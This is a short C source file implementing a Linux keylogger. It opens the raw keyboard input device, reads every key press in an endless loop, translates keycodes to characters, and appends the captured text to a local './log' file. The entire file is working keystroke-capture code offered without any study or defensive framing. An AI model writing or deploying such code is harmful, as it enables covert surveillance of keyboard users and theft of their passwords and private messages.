#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <string.h>

#include "./key.h"
#include "./keylogger.h"

#define str_len 100

int logger(){
    const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    int fd;
    fd  = open(dev, O_RDONLY); /* open buffer */
    
    if(fd == -1){ 
        return -2;
    }

    struct input_event ev;
    ssize_t n;
    keys *k = initialize_keys(); 
    int i = 0, len = 0, ret;
    char str[str_len] = "";

    while(1){
        n = read(fd, &ev, sizeof ev); /* read buffer */
        if(ev.type == EV_KEY && ev.value == 1){
            //printf("%d\n", ev.code);
            while(i < 48){
                if(ev.code == k -> id[i]){
                    //printf("tasto premuto: %s\n", k -> ch[i]);
                    len = len + k -> len[i];
                    strcat(str, k -> ch[i]);
                    
                    if(len >= str_len - 15){
                        ret = w_log("./log", str);
                        //printf("\n\n%d\n\n", len); 
                        len = 0;
                        strcpy(str, "");
                    }

                    break;
                }
                i++;
            }
            i = 0;
        }
    }

    close(fd);
    
    return 0;
}

int w_log(char *path, char *str){
    FILE *f = fopen(path, "a+");
    
    if(!f){
        return -1;
    }
        
    fprintf(f, "%s", str);
    fclose(f);

    return 0;
} 
